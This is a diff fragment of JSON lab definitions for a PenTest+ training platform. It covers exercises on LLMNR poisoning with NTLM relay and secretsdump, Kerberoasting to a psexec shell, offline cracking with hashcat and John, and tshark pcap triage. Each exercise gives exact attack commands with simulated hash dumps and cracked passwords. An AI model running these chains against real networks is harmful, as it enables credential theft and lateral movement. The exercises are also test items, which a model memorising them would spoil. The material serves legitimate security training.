+      "Use Cypher `shortestPath` queries to find privilege escalation paths"
+    ],
+    "realWorldValue": "BloodHound is the industry standard for AD attack-path analysis. Consultants who can run the collection cleanly, ingest it, and explain the resulting path to a client SOC are immediately more effective on internal engagements.",
+    "relatedExamCodes": [
+      "PT0-003"
+    ]
+  },
+  {
+    "id": "comptia-responder-ntlmrelay-terminal-replay",
+    "title": "LLMNR Poisoning \u2192 NTLM Relay \u2192 secretsdump",
+    "description": "Queue the Responder / ntlmrelayx.py / secretsdump chain in the right order. Verify SMB-signing targets before relaying and avoid common mistakes like starting relay before identifying relayable hosts.",
+    "type": "terminal-replay",
+    "difficulty": "advanced",
+    "platform": "CompTIA",
+    "category": "Cybersecurity",
+    "labCategory": "Implement",
+    "technologies": [
+      "Responder",
+      "ntlmrelayx.py",
+      "secretsdump.py",
+      "impacket",
+      "NTLMv2",
+      "SMB signing"
+    ],
+    "version": 1,
+    "scenario": "Internal engagement on `10.10.30.0/24`. SMB signing is not enforced on a subset of hosts. Identify relayable targets, run Responder in analyze mode first, poison LLMNR/NBT-NS, relay captured NTLMv2 auth to an unsigned host, then dump local secrets.",
+    "prompt": "\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$",
+    "commands": [
+      {
+        "id": "c1",
+        "command": "crackmapexec smb 10.10.30.0/24 --gen-relay-list relay-targets.txt",
+        "label": "Generate SMB-signing-off list",
+        "successOutput": "SMB         10.10.30.15     445    WKSTN-015        [*] Windows 10 Pro x64 (signing:False) (SMBv1:False)\nSMB         10.10.30.22     445    WKSTN-022        [*] Windows 10 Pro x64 (signing:False) (SMBv1:False)\nSMB         10.10.30.31     445    WKSTN-031        [*] Windows 10 Pro x64 (signing:True)  (SMBv1:False)\nSMB         10.10.30.40     445    DC01             [*] Windows Server 2022 (signing:True)  (SMBv1:False)\n[*] Wrote relayable hosts to relay-targets.txt (2 hosts)",
+        "errorOutput": "You need a signing-off target list before relaying anything."
+      },
+      {
+        "id": "c2",
+        "command": "sudo responder -I eth0 -A",
+        "label": "Responder analyze mode",
+        "successOutput": "[+] Listeners: HTTP SMB MSSQL FTP LDAP\n[+] Analyze mode: ON (only listening, never responding)\n[*] 10.10.30.22   looking for WPAD.LOCAL via LLMNR\n[*] 10.10.30.19   looking for fileshare01 via NBT-NS\n[*] 10.10.30.27   looking for PRINTER-42 via MDNS",
+        "errorOutput": "Always run analyze mode first to characterise traffic before actively poisoning.",
+        "mustFollowIds": [
+          "c1"
+        ]
+      },
+      {
+        "id": "c3",
+        "command": "sudo ntlmrelayx.py -tf relay-targets.txt -smb2support -socks",
+        "label": "Start ntlmrelayx",
+        "successOutput": "[*] Protocol Client HTTP loaded..\n[*] Protocol Client SMB loaded..\n[*] Running in relay mode to hosts in targetfile\n[*] Setting up SMB Server\n[*] Setting up HTTP Server on port 80\n[*] SOCKS proxy started on port 1080",
+        "errorOutput": "You need a vetted relay target file before launching ntlmrelayx.",
+        "mustFollowIds": [
+          "c1"
+        ]
+      },
+      {
+        "id": "c4",
+        "command": "sudo responder -I eth0 -w -r -f",
+        "label": "Responder poisoning ON",
+        "successOutput": "[+] Listeners: HTTP SMB MSSQL FTP LDAP\n[+] Poisoners: LLMNR NBT-NS MDNS\n[*] [LLMNR]  Poisoned answer sent to 10.10.30.22 for name fileshare01\n[*] [NBT-NS] Poisoned answer sent to 10.10.30.19 for name WPAD",
+        "errorOutput": "Run the analyze pass and stand up the relay listener before turning on poisoning, so captured auth actually gets relayed.",
+        "mustFollowIds": [
+          "c2",
+          "c3"
+        ]
+      },
+      {
+        "id": "c5",
+        "command": "proxychains secretsdump.py -no-pass CORP/ADMINISTRATOR@10.10.30.22",
+        "label": "secretsdump via SOCKS",
+        "successOutput": "[*] Service RemoteRegistry is in stopped state\n[*] Starting service RemoteRegistry\n[*] Target system bootKey: 0x...\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n[*] Cleaning up...",
+        "errorOutput": "secretsdump via SOCKS needs the ntlmrelayx SOCKS proxy up and at least one successful relay session.",
+        "mustFollowIds": [
+          "c3",
+          "c4"
+        ]
+      },
+      {
+        "id": "d1",
+        "command": "sudo ntlmrelayx.py -t smb://10.10.30.40 -smb2support",
+        "label": "Relay to the DC",
+        "successOutput": "",
+        "errorOutput": "DISTRACTOR: `10.10.30.40` is the DC (signing enforced). Relaying to a signing-required host fails and is noisy. Only relay to `signing:False` hosts from the CME list.",
+        "isDistractor": true
+      },
+      {
+        "id": "d2",
+        "command": "sudo responder -I eth0 -wrfv",
+        "label": "Poisoning without prep",
+        "successOutput": "",
+        "errorOutput": "DISTRACTOR: Starting poisoning before running analyze mode and before ntlmrelayx.py is listening wastes captured auth attempts that could have been relayed.",
+        "isDistractor": true
+      },
+      {
+        "id": "d3",
+        "command": "secretsdump.py -no-pass CORP/ADMINISTRATOR@10.10.30.22",
+        "label": "secretsdump without proxychains",
+        "successOutput": "",
+        "errorOutput": "DISTRACTOR: Without `proxychains`, this tries to auth locally rather than routing through the ntlmrelayx SOCKS session. You have no password; you have a relayed session.",
+        "isDistractor": true
+      }
+    ],
+    "explanation": "**NTLM relay chain**\n\n1. **`crackmapexec smb --gen-relay-list`** enumerates SMB signing posture and writes only `signing:False` hosts to a targets file \u2014 the only hosts you can relay to.\n2. **`responder -A`** (analyze mode) observes LLMNR/NBT-NS/MDNS broadcast patterns without actively answering, so you know what clients are asking for.\n3. **`ntlmrelayx.py -tf relay-targets.txt -smb2support -socks`** listens for inbound auth and relays to unsigned hosts; `-socks` opens a SOCKS proxy on TCP/1080 for each relayed session.\n4. **`responder -I eth0 -w -r -f`** (full poisoning) now actually answers the LLMNR/NBT-NS queries with the attacker IP, coercing auth into ntlmrelayx.\n5. **`proxychains secretsdump.py -no-pass \u2026`** dumps local SAM/LSA secrets through the relayed SOCKS session \u2014 no password needed, you have a session.\n\n**Why the distractors are wrong:**\n- The DC (`10.10.30.40`) has signing enforced \u2014 relay will simply fail and generate noisy logs.\n- Poisoning before ntlmrelayx is running means captured auth is lost.\n- Without proxychains, `secretsdump.py` tries to authenticate locally and has nothing to authenticate with.",
+    "learningOutcomes": [
+      "Enumerate SMB signing posture to identify relayable targets before poisoning",
+      "Use Responder analyze mode before full poisoning to avoid blind attacks",
+      "Chain ntlmrelayx.py and secretsdump.py over SOCKS for hashless post-exploitation"
+    ],
+    "realWorldValue": "NTLM relay is still the single highest-value lateral movement primitive on most internal Windows networks. Doing it in the correct sequence \u2014 and only against signing-off hosts \u2014 is the difference between a clean finding and a broken client network.",
+    "relatedExamCodes": [
+      "PT0-003"
+    ]
+  },
+  {
+    "id": "comptia-kerberoasting-terminal-replay",
+    "title": "Kerberoasting a Service Account",
+    "description": "Queue the Kerberoasting attack chain: request a Kerberos service ticket for an SPN-bound account, crack the TGS offline with hashcat mode 13100, then use the cracked password via psexec.py. Reject premature or unsafe moves.",
+    "type": "terminal-replay",
+    "difficulty": "advanced",
+    "platform": "CompTIA",
+    "category": "Cybersecurity",
+    "labCategory": "Implement",
+    "technologies": [
+      "impacket",
+      "GetUserSPNs.py",
+      "hashcat",
+      "Kerberos",
+      "TGS-REP",
+      "psexec.py"
+    ],
+    "version": 1,
+    "scenario": "From a low-priv domain user `j.doe` on `CORP.LOCAL`, kerberoast any SPN-bound service accounts, crack the resulting TGS-REP hash offline, and use the password to get a SYSTEM shell on the SQL server. Distractors include using the wrong hashcat mode, acting on uncracked hashes, and unsafe psexec flags.",
+    "prompt": "\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$",
+    "commands": [
+      {
+        "id": "c1",
+        "command": "GetUserSPNs.py -request -dc-ip 10.10.10.10 CORP.LOCAL/j.doe:'Spring2026!' -outputfile tgs.hash",
+        "label": "Request TGS for all SPNs",
+        "successOutput": "ServicePrincipalName      Name           MemberOf                                                      PasswordLastSet   LastLogon\n------------------------  -------------  ----------------------------------------------------------    ----------------  ----------\nMSSQLSvc/sql01.corp.local svc_sql        CN=Domain Admins,CN=Users,DC=corp,DC=local                    2024-11-04 09:12  2026-04-19\nHTTP/web01.corp.local     svc_web        CN=Service Accounts,CN=Users,DC=corp,DC=local                 2025-03-15 16:40  2026-04-18\n\n[*] Wrote 2 TGS-REP hashes to tgs.hash",
+        "errorOutput": "You must request the TGS tickets before cracking anything."
+      },
+      {
+        "id": "c2",
+        "command": "hashcat -m 13100 -a 0 tgs.hash /usr/share/wordlists/rockyou.txt",
+        "label": "hashcat TGS-REP crack",
+        "successOutput": "hashcat (v6.2.6) starting\n* Device #1: NVIDIA GeForce RTX 3060\n\nDictionary cache hit:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344391\n* Keyspace..: 14344391\n\n$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local*$...:S3rvice!Summer23\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)\nRecovered........: 1/2 (50.00%) Digests",
+        "errorOutput": "You need `tgs.hash` written first. Run GetUserSPNs.py before the crack.",
+        "mustFollowIds": [
+          "c1"
+        ]
+      },
+      {
+        "id": "c3",
+        "command": "psexec.py 'CORP/svc_sql:S3rvice!Summer23@sql01.corp.local'",
+        "label": "psexec with cracked password",
+        "successOutput": "Impacket v0.12.0\n[*] Requesting shares on sql01.corp.local.....\n[*] Found writable share ADMIN$\n[*] Uploading file lLZKxNJx.exe\n[*] Opening SVCManager on sql01.corp.local.....\n[*] Creating service cAzo on sql01.corp.local.....\n[*] Starting service cAzo.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.20348.1906]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32>",
+        "errorOutput": "Crack the TGS first. `psexec.py` needs a real password or hash to authenticate.",
+        "mustFollowIds": [
+          "c2"
+        ]
+      },
+      {
+        "id": "d1",
+        "command": "hashcat -m 1000 -a 0 tgs.hash /usr/share/wordlists/rockyou.txt",
+        "label": "hashcat mode 1000",
+        "successOutput": "",
+        "errorOutput": "DISTRACTOR: `-m 1000` is NTLM, not Kerberos TGS-REP. You will get zero cracks. Use `-m 13100` for RC4 TGS-REP or `-m 19700` for AES.",
+        "isDistractor": true
+      },
+      {
+        "id": "d2",
+        "command": "psexec.py -k -no-pass 'CORP/svc_sql@sql01.corp.local'",
+        "label": "psexec pass-the-ticket before crack",
+        "successOutput": "",
+        "errorOutput": "DISTRACTOR: `-k -no-pass` only works with an existing Kerberos ticket in KRB5CCNAME. You have a TGS-REP hash to crack offline, not a usable TGT for impersonation.",
+        "isDistractor": true
+      },
+      {
+        "id": "d3",
+        "command": "GetUserSPNs.py -request-user DomainAdmin -dc-ip 10.10.10.10 CORP.LOCAL/j.doe:'Spring2026!'",
+        "label": "Target built-in DomainAdmin",
+        "successOutput": "",
+        "errorOutput": "DISTRACTOR: The built-in `Administrator`/`krbtgt` accounts don't have SPNs unless misconfigured, and `DomainAdmin` is not a real user. Request TGS for actual SPN-bound users from `-request`.",
+        "isDistractor": true
+      }
+    ],
+    "explanation": "**Kerberoasting in three moves**\n\n1. **`GetUserSPNs.py -request`** asks the DC for a TGS ticket for every SPN-bound account in the domain, then writes the encrypted portion (TGS-REP hash) to a file. Any domain user can make this request \u2014 no privileges required.\n2. **`hashcat -m 13100`** cracks TGS-REP hashes offline. The crack is offline, so the DC never sees it. Use `-m 19700` if the ticket is AES-encrypted.\n3. **`psexec.py CORP/svc_sql:PASSWORD@host`** uses the cracked service-account password to land a SYSTEM shell on the host where the service runs (often with significant privileges).\n\n**Why the distractors are wrong:**\n- `-m 1000` is NTLM, a completely different hash format. It will not crack TGS-REP.\n- `-k -no-pass` is for pass-the-ticket, not for a TGS-REP hash you still need to crack.\n- Built-in admin accounts typically lack SPNs. Kerberoast actual SPN-bound service accounts identified in step 1.",
+    "learningOutcomes": [
+      "Request TGS tickets for SPN-bound accounts with GetUserSPNs.py",
+      "Use the correct hashcat mode (`-m 13100`/`-m 19700`) for Kerberos TGS-REP cracking",
+      "Chain the crack into a psexec.py shell to abuse the service account"
+    ],
+    "realWorldValue": "Kerberoasting is one of the most common wins on an internal Windows engagement because service accounts often use legacy passwords and have over-privileged group membership. Knowing the exact sequence and the correct crack mode is a PT0-003 staple.",
+    "relatedExamCodes": [
+      "PT0-003"
+    ]
+  },
+  {
+    "id": "comptia-hashcat-modes-command-terminal",
+    "title": "Offline Cracking with Hashcat",
+    "description": "Type `hashcat` invocations for two different hash types with the correct mode, attack type, wordlist, and rule file. Flags can appear in any order.",
+    "type": "command-terminal",
+    "difficulty": "intermediate",
+    "platform": "CompTIA",
+    "category": "Cybersecurity",
+    "labCategory": "Implement",
+    "technologies": [
+      "hashcat",
+      "NTLM",
+      "bcrypt",
+      "rockyou.txt",
+      "best64.rule"
+    ],
+    "version": 1,
+    "scenario": "You captured two hash sets on an authorised engagement: NTLM hashes from `ntds.dit`, and bcrypt hashes from a breached DB backup. Crack each with the correct hashcat mode and a dictionary attack augmented with rules.",
+    "prompt": "\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$",
+    "steps": [
+      {
+        "id": "s1",
+        "task": "Crack NTLM hashes in `ntlm.hash` with a straight dictionary attack against `/usr/share/wordlists/rockyou.txt`, applying the `best64.rule` ruleset. Output cracked results to `cracked-ntlm.txt`.",
+        "hint": "Mode `1000` is NTLM. Attack mode `0` is straight dictionary. The rules flag is `-r`, and the output flag is `-o`.",
+        "program": "hashcat",
+        "requirements": [
+          {
+            "id": "mode",
+            "kind": "flag-value",
+            "variants": [
+              "-m",
+              "--hash-type"
+            ],
+            "value": "1000",
+            "description": "-m, --hash-type=NUM            hash-type, see --help for modes"
+          },
+          {
+            "id": "attack",
+            "kind": "flag-value",
+            "variants": [
+              "-a",
+              "--attack-mode"
+            ],
+            "value": "0",
+            "description": "-a, --attack-mode=NUM          attack-mode, 0=straight, 1=combinator, 3=bruteforce, 6=hybrid"
+          },
+          {
+            "id": "hashfile",
+            "kind": "positional",
+            "variants": [
+              "ntlm.hash"
+            ],
+            "description": "<hashfile>                     path to hashes"
+          },
+          {
+            "id": "wordlist",
+            "kind": "positional",
+            "variants": [
+              "/usr/share/wordlists/rockyou.txt"
+            ],
+            "description": "<wordlist>                     path to wordlist (straight attack)"
+          },
+          {
+            "id": "rule",
+            "kind": "flag-value",
+            "variants": [
+              "-r",
+              "--rules-file"
+            ],
+            "value": "/usr/share/hashcat/rules/best64.rule",
+            "description": "-r, --rules-file=FILE          rules file to apply to each word"
+          },
+          {
+            "id": "out",
+            "kind": "flag-value",
+            "variants": [
+              "-o",
+              "--outfile"
+            ],
+            "value": "cracked-ntlm.txt",
+            "description": "-o, --outfile=FILE             output file for cracked hashes"
+          }
+        ],
+        "distractors": [
+          {
+            "flag": "--force",
+            "description": "--force                        ignore warnings (not recommended on supported platforms)"
+          },
+          {
+            "flag": "--username",
+            "description": "--username                     enable ignoring of usernames in hashfile"
+          },
+          {
+            "flag": "--increment",
+            "description": "--increment                    enable mask increment mode (used with -a 3)"
+          },
+          {
+            "flag": "-w",
+            "description": "-w, --workload-profile=NUM     1=low, 2=default, 3=high, 4=nightmare"
+          }
+        ],
+        "successOutput": "hashcat (v6.2.6) starting\n\nHash.Mode........: 1000 (NTLM)\nAttack.Mode......: 0 (Straight)\nRules.Target.....: File (/usr/share/hashcat/rules/best64.rule)\n\nSession..........: hashcat\nStatus...........: Cracked\nRecovered........: 814/2043 (39.85%) Digests",
+        "canonicalCommand": "hashcat -m 1000 -a 0 ntlm.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -o cracked-ntlm.txt"
+      },
+      {
+        "id": "s2",
+        "task": "Crack bcrypt hashes in `bcrypt.hash` with a straight dictionary attack against `/usr/share/wordlists/rockyou.txt`. No rules, just the dictionary. Output to `cracked-bcrypt.txt`.",
+        "hint": "Bcrypt hashcat mode is `3200`. Straight dictionary is `-a 0`. No rules flag is needed.",
+        "program": "hashcat",
+        "requirements": [
+          {
+            "id": "mode",
+            "kind": "flag-value",
+            "variants": [
+              "-m",
+              "--hash-type"
+            ],
+            "value": "3200",
+            "description": "-m, --hash-type=NUM            hash-type, see --help for modes"
+          },
+          {
+            "id": "attack",
+            "kind": "flag-value",
+            "variants": [
+              "-a",
+              "--attack-mode"
+            ],
+            "value": "0",
+            "description": "-a, --attack-mode=NUM          attack-mode, 0=straight, 1=combinator, 3=bruteforce, 6=hybrid"
+          },
+          {
+            "id": "hashfile",
+            "kind": "positional",
+            "variants": [
+              "bcrypt.hash"
+            ],
+            "description": "<hashfile>                     path to hashes"
+          },
+          {
+            "id": "wordlist",
+            "kind": "positional",
+            "variants": [
+              "/usr/share/wordlists/rockyou.txt"
+            ],
+            "description": "<wordlist>                     path to wordlist (straight attack)"
+          },
+          {
+            "id": "out",
+            "kind": "flag-value",
+            "variants": [
+              "-o",
+              "--outfile"
+            ],
+            "value": "cracked-bcrypt.txt",
+            "description": "-o, --outfile=FILE             output file for cracked hashes"
+          }
+        ],
+        "distractors": [
+          {
+            "flag": "-r",
+            "description": "-r, --rules-file=FILE          rules file to apply to each word (warning: slow with bcrypt)"
+          },
+          {
+            "flag": "--increment",
+            "description": "--increment                    enable mask increment mode (used with -a 3)"
+          },
+          {
+            "flag": "-O",
+            "description": "-O, --optimized-kernel-enable  enable optimised kernels (limited password length)"
+          },
+          {
+            "flag": "--force",
+            "description": "--force                        ignore warnings (not recommended on supported platforms)"
+          }
+        ],
+        "successOutput": "hashcat (v6.2.6) starting\n\nHash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))\nAttack.Mode......: 0 (Straight)\n\nSession..........: hashcat\nStatus...........: Running\nProgress.........: 142/2137 (6.65%)\nRecovered........: 11/50 (22.00%) Digests",
+        "canonicalCommand": "hashcat -m 3200 -a 0 bcrypt.hash /usr/share/wordlists/rockyou.txt -o cracked-bcrypt.txt"
+      }
+    ],
+    "explanation": "**Picking the right hashcat mode is half the battle.**\n\n- **`-m 1000` NTLM** \u2014 Windows local/domain hashes extracted from SAM or ntds.dit. Fast on any modern GPU; rules (`-r best64.rule`) add huge keyspace coverage at trivial cost.\n- **`-m 3200` bcrypt** \u2014 Unix password hashes for services that chose bcrypt deliberately. Slow by design (work factor baked into every hash), so adding rules multiplies an already expensive run. Skip rules, use smart wordlists.\n\n**Attack modes:**\n- `-a 0` = straight dictionary (wordlist only)\n- `-a 1` = combinator (left \u2a2f right wordlists)\n- `-a 3` = brute-force/mask\n- `-a 6` = hybrid wordlist + mask\n\n**Common traps:**\n- `--force` suppresses the sanity check that stops you cracking on a broken platform. Only use if you actually know the warning is spurious.\n- `-O` (optimised kernels) limits password length, which silently drops otherwise-crackable passwords.\n- `--username` strips the `user:` prefix when hashcat parses the hashfile \u2014 helpful for `user:hash` input, not otherwise.",
+    "learningOutcomes": [
+      "Identify the correct hashcat mode for NTLM vs bcrypt hashes",
+      "Combine attack mode, wordlist, and rule files in a single invocation",
+      "Recognise which flags (`-O`, `--force`) silently change cracking behaviour"
+    ],
+    "realWorldValue": "Getting the mode wrong is the single most common hashcat mistake. A report that says \"we could not crack the hashes\" is often really \"we used the wrong -m\". This drill builds the muscle memory for the two most common hash types on real engagements.",
+    "relatedExamCodes": [
+      "PT0-003"
+    ]
+  },
+  {
+    "id": "comptia-john-password-audit-command-terminal",
+    "title": "Local Password Audit with John the Ripper",
+    "description": "Run a realistic John the Ripper audit on a provided `shadow.txt`: wordlist attack with rules, then show cracked results. Flags in any order.",
+    "type": "command-terminal",
+    "difficulty": "beginner",
+    "platform": "CompTIA",
+    "category": "Cybersecurity",
+    "labCategory": "Implement",
+    "technologies": [
+      "john",
+      "SHA512-crypt",
+      "shadow",
+      "rockyou.txt",
+      "Jumbo rules"
+    ],
+    "version": 1,
+    "scenario": "An authorised internal password audit has produced `shadow.txt` (sha512crypt format). Run a dictionary attack with the Jumbo ruleset, then display cracked results. The audit window is short, so incremental brute force is inappropriate.",
+    "prompt": "\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$",
+    "steps": [
+      {
+        "id": "s1",
+        "task": "Run a dictionary attack against `shadow.txt` using `/usr/share/wordlists/rockyou.txt`, the `Jumbo` rules, and forcing sha512crypt format.",
+        "hint": "Use the `--wordlist=`, `--rules=`, and `--format=` long-form flags. The hash file is the positional argument.",
+        "program": "john",
+        "requirements": [
+          {
+            "id": "wl",
+            "kind": "flag-value",
+            "variants": [
+              "--wordlist"
+            ],
+            "value": "/usr/share/wordlists/rockyou.txt",
+            "description": "--wordlist=FILE                wordlist mode, read words from FILE"
+          },
+          {
+            "id": "rules",
+            "kind": "flag-value",
+            "variants": [
+              "--rules"
+            ],
+            "value": "Jumbo",
+            "description": "--rules[=SECTION]              enable word mangling rules (default section Wordlist)"
+          },
+          {
+            "id": "fmt",
+            "kind": "flag-value",
+            "variants": [
+              "--format"
+            ],
+            "value": "sha512crypt",
+            "description": "--format=NAME                  force hash format (sha512crypt, bcrypt, nt, etc.)"
+          },
+          {
+            "id": "hashes",
+            "kind": "positional",
+            "variants": [
+              "shadow.txt"
+            ],
+            "description": "<hashfile>                     path to hashes"
+          }
+        ],
+        "distractors": [
+          {
+            "flag": "--incremental",
+            "description": "--incremental[=MODE]           incremental (brute-force) mode, keyspace-exhaustive"
+          },
+          {
+            "flag": "--single",
+            "description": "--single                       single crack mode, uses login name / GECOS as candidates"
+          },
+          {
+            "flag": "--restore",
+            "description": "--restore[=NAME]               restore an interrupted session"
+          },
+          {
+            "flag": "--fork",
+            "description": "--fork=N                       fork N processes"
+          }
+        ],
+        "successOutput": "Using default input encoding: UTF-8\nLoaded 18 password hashes with 18 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])\nPress 'q' or Ctrl-C to abort, almost any other key for status\n\nautumn2024       (jsmith)\nSummer!2023      (mgonzalez)\nDragon123        (rpatel)\n\n3g 0:00:01:24 DONE (2026-04-20 12:20) 0.0357g/s 214.2p/s 3856c/s 3856C/s 123456..dragon",
+        "canonicalCommand": "john --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo --format=sha512crypt shadow.txt"
+      },
+      {
+        "id": "s2",
+        "task": "Show all currently cracked passwords in `shadow.txt`, still forcing the sha512crypt format so john only reports matching entries.",
+        "hint": "`--show` is the flag. You still need `--format` and the hash file.",
+        "program": "john",
+        "requirements": [
+          {
+            "id": "show",
+            "kind": "flag",
+            "variants": [
+              "--show"
+            ],
+            "description": "--show                         show cracked passwords from the pot file"
+          },
+          {
+            "id": "fmt",
+            "kind": "flag-value",
+            "variants": [
+              "--format"
+            ],
+            "value": "sha512crypt",
+            "description": "--format=NAME                  force hash format (sha512crypt, bcrypt, nt, etc.)"
+          },
+          {
+            "id": "hashes",
+            "kind": "positional",
+            "variants": [
+              "shadow.txt"
+            ],
+            "description": "<hashfile>                     path to hashes"
+          }
+        ],
+        "distractors": [
+          {
+            "flag": "--users",
+            "description": "--users=LOGIN|UID[,...]        filter show/crack output to these users"
+          },
+          {
+            "flag": "--groups",
+            "description": "--groups=GID[,...]             filter show/crack output to these groups"
+          },
+          {
+            "flag": "--pot",
+            "description": "--pot=FILE                     use FILE as the pot file instead of the default"
+          }
+        ],
+        "successOutput": "jsmith:autumn2024:1001:1001:Jane Smith:/home/jsmith:/bin/bash\nmgonzalez:Summer!2023:1002:1002:Maria Gonzalez:/home/mgonzalez:/bin/bash\nrpatel:Dragon123:1003:1003:Raj Patel:/home/rpatel:/bin/bash\n\n3 password hashes cracked, 15 left",
+        "canonicalCommand": "john --show --format=sha512crypt shadow.txt"
+      }
+    ],
+    "explanation": "**John in two steps**\n\n1. **Crack** \u2014 `--wordlist` plus `--rules=Jumbo` is the sweet spot for first-pass audits. `--format=sha512crypt` forces the format so john does not auto-detect and silently pick something else for mixed-format files.\n2. **Show** \u2014 `--show` reads the pot file (`~/.john/john.pot`) and prints all previously cracked entries for the input file, using the same format.\n\n**Why the distractors are wrong:**\n- `--incremental` runs exhaustive brute force and can take days on sha512crypt. A short audit window does not justify it.\n- `--single` mode uses GECOS fields and login names as candidates \u2014 a fine add-on, but not the requested dictionary attack.\n- `--users` / `--groups` are filters, not crack modes. They do not crack anything on their own.",
+    "learningOutcomes": [
+      "Run a wordlist + rules attack with the correct format flag",
+      "Retrieve cracked results from the pot file with `--show`",
+      "Avoid exhaustive incremental mode when it is not appropriate for the engagement window"
+    ],
+    "realWorldValue": "Every PT0-003 candidate runs a password audit at some point. John is the reference Unix-style cracker, and knowing `--wordlist`, `--rules`, `--format`, and `--show` is the bread-and-butter workflow every client wants in the report.",
+    "relatedExamCodes": [
+      "PT0-003"
+    ]
+  },
+  {
+    "id": "comptia-tshark-pcap-analysis-command-terminal",
+    "title": "pcap Triage with tshark",
+    "description": "Extract specific fields from a saved pcap using tshark display filters. Flags accepted in any order.",
+    "type": "command-terminal",
+    "difficulty": "intermediate",
+    "platform": "CompTIA",
+    "category": "Cybersecurity",
+    "labCategory": "Investigate",
+    "technologies": [
+      "tshark",
+      "Wireshark",
+      "pcap",
+      "display filters",
+      "HTTP"
+    ],
+    "version": 1,
+    "scenario": "You were given `capture.pcap` from an authorised network capture. Use tshark to pull HTTP request metadata (source IP, host, URI) into a tabular format suitable for grepping in reports.",
+    "prompt": "\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$",
+    "steps": [
+      {
+        "id": "s1",
+        "task": "Read `capture.pcap`, filter to HTTP requests, and output `ip.src`, `http.host`, and `http.request.uri` as tab-separated fields.",
+        "hint": "`-r` reads a file, `-Y` is the display filter, `-T fields` asks for field output, and `-e` selects each field (repeatable).",
+        "program": "tshark",
+        "requirements": [
+          {
+            "id": "read",
+            "kind": "flag-value",
+            "variants": [
+              "-r",
+              "--read-file"
+            ],
+            "value": "capture.pcap",
+            "description": "-r <infile>                    read packet data from infile"
+          },
+          {
+            "id": "filter",
+            "kind": "flag-value",
+            "variants": [
+              "-Y"
+            ],
+            "value": "http.request",
+            "description": "-Y <display filter>            packet display filter in Wireshark display filter syntax"
+          },
+          {
+            "id": "fmt",
+            "kind": "flag-value",
+            "variants": [
+              "-T"
+            ],
+            "value": "fields",
+            "description": "-T pdml|ps|psml|json|jsonraw|ek|tabs|text|fields   format of text output"
+          },
+          {
+            "id": "f1",
+            "kind": "flag-value",
+            "variants": [
+              "-e"
+            ],
+            "value": "ip.src",
+            "description": "-e <field>                     field to print (repeatable)"
+          },
+          {
+            "id": "f2",
+            "kind": "flag-value",
+            "variants": [
+              "-e"
+            ],
+            "value": "http.host",
+            "description": "-e <field>                     field to print (repeatable)"
+          },
+          {
+            "id": "f3",
+            "kind": "flag-value",
+            "variants": [
+              "-e"
+            ],
+            "value": "http.request.uri",
+            "description": "-e <field>                     field to print (repeatable)"
+          }
+        ],
+        "distractors": [
+          {
+            "flag": "-V",
+            "description": "-V                             add packet tree information to the output (verbose)"
+          },
+          {
+            "flag": "-x",
+            "description": "-x                             add hex and ASCII dump to the output"
+          },
+          {
+            "flag": "-f",
+            "description": "-f <capture filter>            capture filter in libpcap syntax (for live capture only)"
+          },
+          {
+            "flag": "-q",
+            "description": "-q                             quiet - do not print packets, print summary only"
+          }
+        ],
+        "successOutput": "10.10.10.42\twww.acme-corp.test\t/login\n10.10.10.42\twww.acme-corp.test\t/dashboard\n10.10.10.85\tapi.acme-corp.test\t/v1/users/me\n10.10.10.42\twww.acme-corp.test\t/admin/users\n10.10.10.85\tapi.acme-corp.test\t/v1/orders?limit=50",
+        "canonicalCommand": "tshark -r capture.pcap -Y http.request -T fields -e ip.src -e http.host -e http.request.uri"
+      }
+    ],
+    "explanation": "**tshark fields-mode is the right tool for grep-friendly pcap analysis.**\n\n- `-r capture.pcap` \u2014 read from a saved capture (not live).\n- `-Y http.request` \u2014 display filter in Wireshark syntax, keeping only HTTP request packets.\n- `-T fields` \u2014 print as tab-separated fields instead of the default packet summary or verbose tree.\n- `-e <field>` \u2014 one field per flag; repeat it. Field names match Wireshark's display-filter names.\n\n**Why the distractors are wrong:**\n- `-V` expands each packet into its full tree representation. Huge output on any non-trivial pcap.\n- `-x` prints a hex dump, useful for protocol reverse engineering but not for tabular extraction.\n- `-f` is for live-capture (libpcap BPF) filters, not display filters on saved pcaps.\n- `-q` suppresses per-packet output entirely, defeating the point of this task.",
+    "learningOutcomes": [
+      "Use tshark's fields output mode for grep-friendly pcap analysis",
+      "Distinguish display filters (`-Y`) from capture filters (`-f`)",
+      "Select and order specific Wireshark fields via repeated `-e` flags"
+    ],
+    "realWorldValue": "Every pentester ends up reading pcaps, whether for validating a capture, triaging a finding, or extracting evidence for the report. tshark fields-mode is the fastest way to get tabular evidence without opening the Wireshark GUI.",
+    "relatedExamCodes": [
+      "PT0-003"
+    ]
+  },
+  {
+    "id": "comptia-curl-webapp-probe-command-terminal",
+    "title": "Manual Web API Probing with curl",
+    "description": "Send a well-formed POST request to an authorised API endpoint with a JSON body, a session cookie, and TLS verification disabled for the lab cert. Flags accepted in any order.",
+    "type": "command-terminal",
+    "difficulty": "beginner",
+    "platform": "CompTIA",
+    "category": "Cybersecurity",
+    "labCategory": "Implement",
+    "technologies": [
+      "curl",
+      "HTTP",
+      "JSON",
+      "TLS",
+      "cookies"
+    ],
+    "version": 1,
+    "scenario": "You have an authenticated session cookie for `https://api.acme-corp.test`. Send a JSON-bodied POST to the `/v1/orders` endpoint. The test environment uses a self-signed cert so you must tell curl to skip verification. You want to see response headers in the output.",
